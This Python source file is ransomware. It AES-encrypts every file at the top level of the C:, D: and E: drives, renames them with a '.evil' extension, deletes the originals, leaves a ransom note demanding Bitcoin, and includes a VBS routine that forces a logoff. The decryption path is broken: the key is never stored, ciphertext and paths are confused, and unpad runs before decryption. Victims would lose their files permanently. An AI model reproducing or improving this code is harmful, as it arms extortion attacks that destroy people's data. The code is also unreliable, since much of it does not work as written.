import os
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import subprocess

def generate_key(key_size=32):
    return get_random_bytes(key_size)

def generate_iv():
    return get_random_bytes(16)

def encrypt_file(file_path, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as file:
        plaintext = file.read()

    plaintext = pad(plaintext, AES.block_size)
    ciphertext = cipher.encrypt(plaintext)

    return iv + ciphertext

def decrypt_file(file_path, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)

    ciphertext = file_path[16:]
    ciphertext = unpad(ciphertext, AES.block_size)

    try:
        decrypted_text = cipher.decrypt(ciphertext)
    except ValueError:
        return False

    with open(file_path[:-5], 'wb') as file:
        file.write(decrypted_text)

    return True

def decrypt_all_files():
    if ransom_key == 'your_verification_key':  # replace 'your_verification_key' with the actual key or token to verify payment
        key = generate_key()
        directories_to_decrypt = ['C:\\', 'D:\\', 'E:\\']

        for directory in directories_to_decrypt:
            decrypt_directory(directory, key)

        return True
    else:
        return False

def encrypt_directory(directory, key):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path) and not file_path.endswith('.evil'):
            iv = generate_iv()
            ciphertext = encrypt_file(file_path, key, iv)
            encrypted_file_path = file_path + '.evil'

            with open(encrypted_file_path, 'wb') as file:
                file.write(iv)
                file.write(ciphertext)

            os.remove(file_path)

def decrypt_directory(directory, key):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path) and file_path.endswith('.evil'):
            iv = file_path[-16:]
            with open(file_path, 'rb') as file:
                ciphertext = file.read()

            if decrypt_file(ciphertext, key, iv):
                os.remove(file_path)

def display_ransom_note(directory, key):
    ransom_note_path = os.path.join(directory, 'README_TO_DECRYPT.txt')
    with open(ransom_note_path, 'w') as file:
        file.write("Your files have been encrypted. Send payment please - (BitCoin Account)'")

def lock_system():
    with open('lock.vbs', 'w') as f:
        f.write("Set objShell = WScript.CreateObject(\"WScript.Shell\")\n")
        f.write("objShell.Run \"cmd /c shutdown /l /t 0\", 0, True")
    subprocess.run(["cscript.exe", "lock.vbs"], capture_output=True)
    os.remove("lock.vbs")

ransom_key = '1234567890123456'  # Hardcoded key to verify payment

def main():
    key = generate_key()
    directories_to_encrypt = ['C:\\', 'D:\\', 'E:\\']

    for directory in directories_to_encrypt:
        encrypt_directory(directory, key)

    display_ransom_note('C:\\', key)

if __name__ == '__main__':
    main()
